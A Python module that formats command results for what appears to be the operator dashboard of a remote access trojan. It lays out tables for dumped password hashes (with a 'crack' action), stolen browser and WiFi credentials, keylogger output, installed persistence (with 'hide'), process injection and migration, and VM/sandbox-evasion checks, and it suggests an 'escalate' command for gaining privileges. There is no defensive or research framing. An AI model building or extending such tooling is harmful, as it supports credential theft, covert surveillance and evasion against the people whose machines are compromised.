#!/usr/bin/env python3
"""
Result Formatters for Elite Commands
Formats command output for frontend display
"""

import base64
import json
from typing import Dict, Any, List

class EliteResultFormatter:
    """Format elite command results for dashboard display"""
    
    @staticmethod
    def format_for_dashboard(command: str, raw_result: Dict[str, Any]) -> Dict[str, Any]:
        """Convert raw elite command output to dashboard-friendly format"""
        
        formatters = {
            'hashdump': EliteResultFormatter._format_hashes,
            'chromedump': EliteResultFormatter._format_chrome,
            'wifikeys': EliteResultFormatter._format_wifi,
            'ls': EliteResultFormatter._format_ls,
            'ps': EliteResultFormatter._format_processes,
            'systeminfo': EliteResultFormatter._format_sysinfo,
            'screenshot': EliteResultFormatter._format_image,
            'keylogger': EliteResultFormatter._format_keylog,
            'persistence': EliteResultFormatter._format_persistence,
            'network': EliteResultFormatter._format_network,
            'privileges': EliteResultFormatter._format_privileges,
            'vmscan': EliteResultFormatter._format_vmscan
        }
        
        formatter = formatters.get(command, EliteResultFormatter._format_generic)
        return formatter(raw_result)
    
    @staticmethod
    def _format_hashes(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format password hashes for display"""
        return {
            'type': 'table',
            'title': 'Extracted Password Hashes',
            'columns': ['Username', 'RID', 'NTLM Hash', 'LM Hash'],
            'data': result.get('hashes', []),
            'exportable': True,
            'export_format': 'csv',
            'sensitive': True,
            'actions': ['copy', 'crack']
        }
    
    @staticmethod
    def _format_chrome(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format Chrome passwords for display"""
        return {
            'type': 'secure_table',
            'title': 'Browser Credentials',
            'columns': ['URL', 'Username', 'Password'],
            'data': result.get('passwords', []),
            'masked': True,  # Mask passwords initially
            'exportable': True,
            'export_format': 'json',
            'sensitive': True,
            'actions': ['show', 'copy', 'export']
        }
    
    @staticmethod
    def _format_wifi(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format WiFi passwords for display"""
        return {
            'type': 'table',
            'title': 'WiFi Network Credentials',
            'columns': ['SSID', 'Security', 'Password'],
            'data': result.get('networks', []),
            'exportable': True,
            'export_format': 'json',
            'sensitive': True
        }
    
    @staticmethod
    def _format_ls(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format directory listing for display"""
        files = result.get('files', [])
        
        # Add icons and formatting
        for file_info in files:
            if file_info.get('hidden'):
                file_info['icon'] = 'fas fa-eye-slash'
                file_info['class'] = 'text-warning'
            elif file_info.get('system'):
                file_info['icon'] = 'fas fa-cog'
                file_info['class'] = 'text-info'
            else:
                file_info['icon'] = 'fas fa-file'
                file_info['class'] = ''
        
        return {
            'type': 'file_table',
            'title': 'Directory Contents (Elite Mode)',
            'columns': ['Name', 'Size', 'Type', 'Hidden', 'ADS', 'Actions'],
            'data': files,
            'actions': ['download', 'view', 'hide', 'delete'],
            'supports_upload': True
        }
    
    @staticmethod
    def _format_processes(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format process list for display"""
        return {
            'type': 'process_table',
            'title': 'Running Processes',
            'columns': ['PID', 'Name', 'User', 'Memory', 'CPU', 'Path'],
            'data': result.get('processes', []),
            'actions': ['kill', 'migrate', 'inject', 'suspend'],
            'sortable': True,
            'filterable': True
        }
    
    @staticmethod
    def _format_sysinfo(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format system information for display"""
        return {
            'type': 'info_cards',
            'title': 'System Information',
            'sections': {
                'System': {
                    'OS': result.get('os', 'Unknown'),
                    'Architecture': result.get('arch', 'Unknown'),
                    'Hostname': result.get('hostname', 'Unknown'),
                    'Domain': result.get('domain', 'N/A')
                },
                'Hardware': {
                    'CPU': result.get('cpu', 'Unknown'),
                    'Memory': result.get('memory', 'Unknown'),
                    'Disk': result.get('disk', 'Unknown')
                },
                'Security': {
                    'Antivirus': result.get('antivirus', 'Unknown'),
                    'Firewall': result.get('firewall', 'Unknown'),
                    'UAC': result.get('uac', 'Unknown')
                }
            },
            'exportable': True
        }
    
    @staticmethod
    def _format_image(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format image data for display"""
        return {
            'type': 'image',
            'title': 'Screenshot',
            'image_data': result.get('image_data', ''),
            'format': result.get('format', 'PNG'),
            'timestamp': result.get('timestamp'),
            'actions': ['download', 'fullscreen', 'refresh']
        }
    
    @staticmethod
    def _format_keylog(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format keylogger data for display"""
        return {
            'type': 'keylog',
            'title': 'Keylogger Output',
            'data': result.get('keys', []),
            'live': result.get('live', False),
            'actions': ['start', 'stop', 'clear', 'export'],
            'sensitive': True
        }
    
    @staticmethod
    def _format_persistence(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format persistence installation results"""
        return {
            'type': 'status_list',
            'title': 'Persistence Methods',
            'items': [
                {
                    'name': method,
                    'status': 'installed',
                    'icon': 'fas fa-check-circle',
                    'class': 'text-success'
                } for method in result.get('installed', [])
            ],
            'actions': ['remove', 'test', 'hide']
        }
    
    @staticmethod
    def _format_network(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format network information"""
        return {
            'type': 'network_info',
            'title': 'Network Configuration',
            'interfaces': result.get('interfaces', []),
            'connections': result.get('connections', []),
            'routes': result.get('routes', []),
            'dns': result.get('dns', [])
        }
    
    @staticmethod
    def _format_privileges(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format privilege information"""
        return {
            'type': 'privilege_list',
            'title': 'User Privileges',
            'privileges': result.get('privileges', []),
            'groups': result.get('groups', []),
            'admin': result.get('is_admin', False)
        }
    
    @staticmethod
    def _format_vmscan(result: Dict[str, Any]) -> Dict[str, Any]:
        """Format VM detection results"""
        return {
            'type': 'detection_results',
            'title': 'VM/Sandbox Detection',
            'is_vm': result.get('is_vm', False),
            'confidence': result.get('confidence', 0),
            'indicators': result.get('indicators', []),
            'recommendations': result.get('recommendations', [])
        }
    
    @staticmethod
    def _format_generic(result: Dict[str, Any]) -> Dict[str, Any]:
        """Generic formatter for unspecified commands"""
        return {
            'type': 'generic',
            'title': 'Command Output',
            'data': result,
            'raw': True
        }
    
    @staticmethod
    def format_error(command: str, error: str) -> Dict[str, Any]:
        """Format error message for display"""
        return {
            'type': 'error',
            'title': f'Command Failed: {command}',
            'error': error,
            'timestamp': None,
            'suggestions': EliteResultFormatter._get_error_suggestions(command, error)
        }
    
    @staticmethod
    def _get_error_suggestions(command: str, error: str) -> List[str]:
        """Get suggestions for common errors"""
        suggestions = []
        
        if 'permission' in error.lower() or 'access' in error.lower():
            suggestions.append("Try running with administrator privileges")
            suggestions.append("Use the 'escalate' command to gain higher privileges")
        
        if 'not found' in error.lower():
            suggestions.append(f"Verify the {command} command is available on this system")
            suggestions.append("Check if the target file/process exists")
        
        if 'timeout' in error.lower():
            suggestions.append("The operation may be taking longer than expected")
            suggestions.append("Try running the command again")
        
        return suggestions


def format_command_result(command: str, result: Dict[str, Any]) -> Dict[str, Any]:
    """Main function to format any command result"""
    
    if result.get('success', True) and 'error' not in result:
        return EliteResultFormatter.format_for_dashboard(command, result)
    else:
        error = result.get('error', 'Unknown error occurred')
        return EliteResultFormatter.format_error(command, error)


if __name__ == "__main__":
    # Test formatters
    # print("Testing Result Formatters...")
    
    # Test hash formatter
    test_hashes = {
        'hashes': [
            {'username': 'Administrator', 'rid': 500, 'ntlm': 'aad3b435b51404eeaad3b435b51404ee'},
            {'username': 'Guest', 'rid': 501, 'ntlm': '31d6cfe0d16ae931b73c59d7e0c089c0'}
        ]
    }
    
    formatted = format_command_result('hashdump', test_hashes)
    # print(f"Hash format test: {formatted['type']}")
    
    # Test error formatter
    error_result = {'success': False, 'error': 'Access denied'}
    formatted_error = format_command_result('hashdump', error_result)
    # print(f"Error format test: {formatted_error['type']}")
    
    # print("✅ Result formatters working correctly")